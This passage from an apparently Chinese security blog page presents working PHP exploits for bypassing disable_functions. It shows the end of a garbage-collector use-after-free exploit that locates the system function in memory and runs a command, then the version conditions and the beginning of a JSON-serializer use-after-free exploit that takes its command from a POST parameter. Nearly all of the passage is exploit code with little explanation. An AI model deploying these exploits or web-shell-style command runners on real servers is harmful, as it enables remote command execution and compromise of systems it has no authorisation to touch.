class="hljs-variable">$e_phentsize</span>;<br>            <span class="hljs-variable">$p_type</span>  = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$header</span>, <span class="hljs-number">0</span>, <span class="hljs-number">4</span>);<br>            <span class="hljs-variable">$p_flags</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$header</span>, <span class="hljs-number">4</span>, <span class="hljs-number">4</span>);<br>            <span class="hljs-variable">$p_vaddr</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$header</span>, <span class="hljs-number">0x10</span>);<br>            <span class="hljs-variable">$p_memsz</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$header</span>, <span class="hljs-number">0x28</span>);<br><br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$p_type</span> == <span class="hljs-number">1</span> &amp;&amp; <span class="hljs-variable">$p_flags</span> == <span class="hljs-number">6</span>) &#123; <span class="hljs-comment"># PT_LOAD, PF_Read_Write</span><br>                <span class="hljs-comment"># handle pie</span><br>                <span class="hljs-variable">$data_addr</span> = <span class="hljs-variable">$e_type</span> == <span class="hljs-number">2</span> ? <span class="hljs-variable">$p_vaddr</span> : <span class="hljs-variable">$base</span> + <span class="hljs-variable">$p_vaddr</span>;<br>                <span class="hljs-variable">$data_size</span> = <span class="hljs-variable">$p_memsz</span>;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$p_type</span> == <span class="hljs-number">1</span> &amp;&amp; <span class="hljs-variable">$p_flags</span> == <span class="hljs-number">5</span>) &#123; <span class="hljs-comment"># PT_LOAD, PF_Read_exec</span><br>                <span class="hljs-variable">$text_size</span> = <span class="hljs-variable">$p_memsz</span>;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span>(!<span class="hljs-variable">$data_addr</span> || !<span class="hljs-variable">$text_size</span> || !<span class="hljs-variable">$data_size</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br><br>        <span class="hljs-keyword">return</span> [<span class="hljs-variable">$data_addr</span>, <span class="hljs-variable">$text_size</span>, <span class="hljs-variable">$data_size</span>];<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_basic_funcs</span>(<span class="hljs-params"><span class="hljs-variable">$base</span>, <span class="hljs-variable">$elf</span></span>) </span>&#123;<br>        <span class="hljs-keyword">list</span>(<span class="hljs-variable">$data_addr</span>, <span class="hljs-variable">$text_size</span>, <span class="hljs-variable">$data_size</span>) = <span class="hljs-variable">$elf</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$data_size</span> / <span class="hljs-number">8</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$leak</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$data_addr</span>, <span class="hljs-variable">$i</span> * <span class="hljs-number">8</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$leak</span> - <span class="hljs-variable">$base</span> &gt; <span class="hljs-number">0</span> &amp;&amp; <span class="hljs-variable">$leak</span> - <span class="hljs-variable">$base</span> &lt; <span class="hljs-variable">$data_addr</span> - <span class="hljs-variable">$base</span>) &#123;<br>                <span class="hljs-variable">$deref</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$leak</span>);<br>                <span class="hljs-comment"># &#x27;constant&#x27; constant check</span><br>                <span class="hljs-keyword">if</span>(<span class="hljs-variable">$deref</span> != <span class="hljs-number">0x746e6174736e6f63</span>)<br>                    <span class="hljs-keyword">continue</span>;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">continue</span>;<br><br>            <span class="hljs-variable">$leak</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$data_addr</span>, (<span class="hljs-variable">$i</span> + <span class="hljs-number">4</span>) * <span class="hljs-number">8</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$leak</span> - <span class="hljs-variable">$base</span> &gt; <span class="hljs-number">0</span> &amp;&amp; <span class="hljs-variable">$leak</span> - <span class="hljs-variable">$base</span> &lt; <span class="hljs-variable">$data_addr</span> - <span class="hljs-variable">$base</span>) &#123;<br>                <span class="hljs-variable">$deref</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$leak</span>);<br>                <span class="hljs-comment"># &#x27;bin2hex&#x27; constant check</span><br>                <span class="hljs-keyword">if</span>(<span class="hljs-variable">$deref</span> != <span class="hljs-number">0x786568326e6962</span>)<br>                    <span class="hljs-keyword">continue</span>;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">continue</span>;<br><br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$data_addr</span> + <span class="hljs-variable">$i</span> * <span class="hljs-number">8</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_binary_base</span>(<span class="hljs-params"><span class="hljs-variable">$binary_leak</span></span>) </span>&#123;<br>        <span class="hljs-variable">$base</span> = <span class="hljs-number">0</span>;<br>        <span class="hljs-variable">$start</span> = <span class="hljs-variable">$binary_leak</span> &amp; <span class="hljs-number">0xfffffffffffff000</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">0x1000</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$addr</span> = <span class="hljs-variable">$start</span> - <span class="hljs-number">0x1000</span> * <span class="hljs-variable">$i</span>;<br>            <span class="hljs-variable">$leak</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$addr</span>, <span class="hljs-number">0</span>, <span class="hljs-number">7</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$leak</span> == <span class="hljs-number">0x10102464c457f</span>) &#123; <span class="hljs-comment"># ELF header</span><br>                <span class="hljs-keyword">return</span> <span class="hljs-variable">$addr</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_system</span>(<span class="hljs-params"><span class="hljs-variable">$basic_funcs</span></span>) </span>&#123;<br>        <span class="hljs-variable">$addr</span> = <span class="hljs-variable">$basic_funcs</span>;<br>        <span class="hljs-keyword">do</span> &#123;<br>            <span class="hljs-variable">$f_entry</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$addr</span>);<br>            <span class="hljs-variable">$f_name</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$f_entry</span>, <span class="hljs-number">0</span>, <span class="hljs-number">6</span>);<br><br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$f_name</span> == <span class="hljs-number">0x6d6574737973</span>) &#123; <span class="hljs-comment"># system</span><br>                <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$addr</span> + <span class="hljs-number">8</span>);<br>            &#125;<br>            <span class="hljs-variable">$addr</span> += <span class="hljs-number">0x20</span>;<br>        &#125; <span class="hljs-keyword">while</span>(<span class="hljs-variable">$f_entry</span> != <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ryat</span> </span>&#123;<br>        <span class="hljs-keyword">var</span> <span class="hljs-variable">$ryat</span>;<br>        <span class="hljs-keyword">var</span> <span class="hljs-variable">$chtg</span>;<br>        <br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;chtg = <span class="hljs-variable language_">$this</span>-&gt;ryat;<br>            <span class="hljs-variable language_">$this</span>-&gt;ryat = <span class="hljs-number">1</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Helper</span> </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>, <span class="hljs-variable">$b</span>, <span class="hljs-variable">$c</span>, <span class="hljs-variable">$d</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">stristr</span>(PHP_OS, <span class="hljs-string">&#x27;WIN&#x27;</span>)) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;This PoC is for *nix systems only.&#x27;</span>);<br>    &#125;<br><br>    <span class="hljs-variable">$n_alloc</span> = <span class="hljs-number">10</span>; <span class="hljs-comment"># increase this value if you get segfaults</span><br><br>    <span class="hljs-variable">$contiguous</span> = [];<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$n_alloc</span>; <span class="hljs-variable">$i</span>++)<br>        <span class="hljs-variable">$contiguous</span>[] = <span class="hljs-title function_ invoke__">str_repeat</span>(<span class="hljs-string">&#x27;A&#x27;</span>, <span class="hljs-number">79</span>);<br><br>    <span class="hljs-variable">$poc</span> = <span class="hljs-string">&#x27;a:4:&#123;i:0;i:1;i:1;a:1:&#123;i:0;O:4:&quot;ryat&quot;:2:&#123;s:4:&quot;ryat&quot;;R:3;s:4:&quot;chtg&quot;;i:2;&#125;&#125;i:1;i:3;i:2;R:5;&#125;&#x27;</span>;<br>    <span class="hljs-variable">$out</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$poc</span>);<br>    <span class="hljs-title function_ invoke__">gc_collect_cycles</span>();<br><br>    <span class="hljs-variable">$v</span> = [];<br>    <span class="hljs-variable">$v</span>[<span class="hljs-number">0</span>] = <span class="hljs-title function_ invoke__">ptr2str</span>(<span class="hljs-number">0</span>, <span class="hljs-number">79</span>);<br>    <span class="hljs-keyword">unset</span>(<span class="hljs-variable">$v</span>);<br>    <span class="hljs-variable">$abc</span> = <span class="hljs-variable">$out</span>[<span class="hljs-number">2</span>][<span class="hljs-number">0</span>];<br><br>    <span class="hljs-variable">$helper</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Helper</span>;<br>    <span class="hljs-variable">$helper</span>-&gt;b = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"><span class="hljs-variable">$x</span></span>) </span>&#123; &#125;;<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$abc</span>) == <span class="hljs-number">79</span> || <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$abc</span>) == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;UAF failed&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment"># leaks</span><br>    <span class="hljs-variable">$closure_handlers</span> = <span class="hljs-title function_ invoke__">str2ptr</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-variable">$php_heap</span> = <span class="hljs-title function_ invoke__">str2ptr</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x58</span>);<br>    <span class="hljs-variable">$abc_addr</span> = <span class="hljs-variable">$php_heap</span> - <span class="hljs-number">0xc8</span>;<br><br>    <span class="hljs-comment"># fake value</span><br>    <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">2</span>);<br>    <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">6</span>);<br><br>    <span class="hljs-comment"># fake reference</span><br>    <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x10</span>, <span class="hljs-variable">$abc_addr</span> + <span class="hljs-number">0x60</span>);<br>    <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0xa</span>);<br><br>    <span class="hljs-variable">$closure_obj</span> = <span class="hljs-title function_ invoke__">str2ptr</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x20</span>);<br><br>    <span class="hljs-variable">$binary_leak</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$closure_handlers</span>, <span class="hljs-number">8</span>);<br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-variable">$base</span> = <span class="hljs-title function_ invoke__">get_binary_base</span>(<span class="hljs-variable">$binary_leak</span>))) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Couldn&#x27;t determine binary base address&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-variable">$elf</span> = <span class="hljs-title function_ invoke__">parse_elf</span>(<span class="hljs-variable">$base</span>))) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Couldn&#x27;t parse ELF header&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-variable">$basic_funcs</span> = <span class="hljs-title function_ invoke__">get_basic_funcs</span>(<span class="hljs-variable">$base</span>, <span class="hljs-variable">$elf</span>))) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Couldn&#x27;t get basic_functions address&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-variable">$zif_system</span> = <span class="hljs-title function_ invoke__">get_system</span>(<span class="hljs-variable">$basic_funcs</span>))) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Couldn&#x27;t get zif_system address&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment"># fake closure object</span><br>    <span class="hljs-variable">$fake_obj_offset</span> = <span class="hljs-number">0xd0</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">0x110</span>; <span class="hljs-variable">$i</span> += <span class="hljs-number">8</span>) &#123;<br>        <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-variable">$fake_obj_offset</span> + <span class="hljs-variable">$i</span>, <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$closure_obj</span>, <span class="hljs-variable">$i</span>));<br>    &#125;<br><br>    <span class="hljs-comment"># pwn</span><br>    <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x20</span>, <span class="hljs-variable">$abc_addr</span> + <span class="hljs-variable">$fake_obj_offset</span>);<br>    <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0xd0</span> + <span class="hljs-number">0x38</span>, <span class="hljs-number">1</span>, <span class="hljs-number">4</span>); <span class="hljs-comment"># internal func type</span><br>    <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0xd0</span> + <span class="hljs-number">0x68</span>, <span class="hljs-variable">$zif_system</span>); <span class="hljs-comment"># internal func handler</span><br><br>    (<span class="hljs-variable">$helper</span>-&gt;b)(<span class="hljs-variable">$cmd</span>);<br><br>    <span class="hljs-keyword">exit</span>();<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="JSON-Serializer-UAF（PHP-7-1-7-3）"><a href="#JSON-Serializer-UAF（PHP-7-1-7-3）" class="headerlink" title="JSON_Serializer_UAF（PHP 7.1-7.3）"></a>JSON_Serializer_UAF（PHP 7.1-7.3）</h2><p><strong>利用条件</strong></p><ul><li>Linux 操作系统</li><li>PHP7.1 - all versions to date</li><li>PHP7.2 &lt; 7.2.19 (released: 30 May 2019)</li><li>PHP7.3 &lt; 7.3.6 (released: 30 May 2019)</li></ul><p><strong>原理</strong></p><p>此漏洞利用json序列化程序中的释放后使用漏洞，利用json序列化程序中的堆溢出触发，以绕过 disable_functions 和执行系统命令</p><p><a href="https://bugs.php.net/bug.php?id=77843">Use after free with json serializer</a></p><p><strong>exp</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">//$cmd = &quot;id&quot;;</span><br><span class="hljs-variable">$cmd</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br><br><span class="hljs-variable">$n_alloc</span> = <span class="hljs-number">10</span>; <span class="hljs-comment"># increase this value if you get segfaults</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MySplFixedArray</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">SplFixedArray</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> <span class="hljs-variable">$leak</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Z</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">JsonSerializable</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">write</span>(<span class="hljs-params">&amp;<span class="hljs-variable">$str</span>, <span class="hljs-variable">$p</span>, <span class="hljs-variable">$v</span>, <span class="hljs-variable">$n</span> = <span class="hljs-number">8</span></span>) </span>&#123;<br>      <span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>;<br>      <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$n</span>; <span class="hljs-variable">$i</span>++) &#123;<br>        <span class="hljs-variable">$str</span>[<span class="hljs-variable">$p</span> + <span class="hljs-variable">$i</span>] = <span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$v</span> &amp; <span class="hljs-number">0xff</span>);<br>        <span class="hljs-variable">$v</span> &gt;&gt;= <span class="hljs-number">8</span>;<br>      &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">str2ptr</span>(<span class="hljs-params">&amp;<span class="hljs-variable">$str</span>, <span class="hljs-variable">$p</span> = <span class="hljs-number">0</span>, <span class="hljs-variable">$s</span> = <span class="hljs-number">8</span></span>) </span>&#123;<br>        <span class="hljs-variable">$address</span> = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$j</span> = <span class="hljs-variable">$s</span>-<span class="hljs-number">1</span>; <span class="hljs-variable">$j</span> &gt;= <span class="hljs-number">0</span>; <span class="hljs-variable">$j</span>--) &#123;<br>            <span class="hljs-variable">$address</span> &lt;&lt;= <span class="hljs-number">8</span>;<br>            <span class="hljs-variable">$address</span> |= <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$str</span>[<span class="hljs-variable">$p</span>+<span class="hljs-variable">$j</span>]);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$address</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">ptr2str</span>(<span class="hljs-params"><span class="hljs-variable">$ptr</span>, <span class="hljs-variable">$m</span> = <span class="hljs-number">8</span></span>) </span>&#123;<br>        <span class="hljs-variable">$out</span> = <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$m</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$out</span> .= <span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$ptr</span> &amp; <span class="hljs-number">0xff</span>);<br>            <span class="hljs-variable">$ptr</span> &gt;&gt;= <span class="hljs-number">8</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$out</span>;<br>    &#125;<br><br>    <span class="hljs-comment"># unable to leak ro segments</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">leak1</span>(<span class="hljs-params"><span class="hljs-variable">$addr</span></span>) </span>&#123;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$spl1</span>;<br><br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$this</span>-&gt;abc, <span class="hljs-number">8</span>, <span class="hljs-variable">$addr</span> - <span class="hljs-number">0x10</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-title function_ invoke__">get_class</span>(<span class="hljs-variable">$spl1</span>));<br>    &#125;<br><br>    <span class="hljs-comment"># the real deal</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">leak2</span>(<span class="hljs-params"><span class="hljs-variable">$addr</span>, <span class="hljs-variable">$p</span> = <span class="hljs-number">0</span>, <span class="hljs-variable">$s</span> = <span class="hljs-number">8</span></span>) </span>&#123;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$spl1</span>, <span class="hljs-variable">$fake_tbl_off</span>;<br><br>        <span class="hljs-comment"># fake reference zval</span><br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$this</span>-&gt;abc, <span class="hljs-variable">$fake_tbl_off</span> + <span class="hljs-number">0x10</span>, <span class="hljs-number">0xdeadbeef</span>); <span class="hljs-comment"># gc_refcounted</span><br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$this</span>-&gt;abc, <span class="hljs-variable">$fake_tbl_off</span> + <span class="hljs-number">0x18</span>, <span class="hljs-variable">$addr</span> + <span class="hljs-variable">$p</span> - <span class="hljs-number">0x10</span>); <span class="hljs-comment"># zval</span><br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$this</span>-&gt;abc, <span class="hljs-variable">$fake_tbl_off</span> + <span class="hljs-number">0x20</span>, <span class="hljs-number">6</span>); <span class="hljs-comment"># type (string)</span><br><br>        <span class="hljs-variable">$leak</span> = <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$spl1</span>::<span class="hljs-variable">$leak</span>);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$s</span> != <span class="hljs-number">8</span>) &#123; <span class="hljs-variable">$leak</span> %= <span class="hljs-number">2</span> &lt;&lt; (<span class="hljs-variable">$s</span> * <span class="hljs-number">8</span>) - <span class="hljs-number">1</span>; &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$leak</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">parse_elf</span>(<span class="hljs-params"><span class="hljs-variable">$base</span></span>) </span>&#123;<br>        <span class="hljs-variable">$e_type</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">leak2</span>(<span class="hljs-variable">$base</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">2</span>);<br><br>        <span class="hljs-variable">$e_phoff</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">leak2</span>(<span class="hljs-variable">$base</span>, <span class="hljs-number">0x20</span>);<br>        <span class="hljs-variable">$e_phentsize</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">leak2</span>(<span class="hljs-variable">$base</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">2</span>);<br>        <span class="hljs-variable">$e_phnum</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">leak2</span>(<span class="hljs-variable">$base</span>, <span class="hljs-number">0x38</span>, 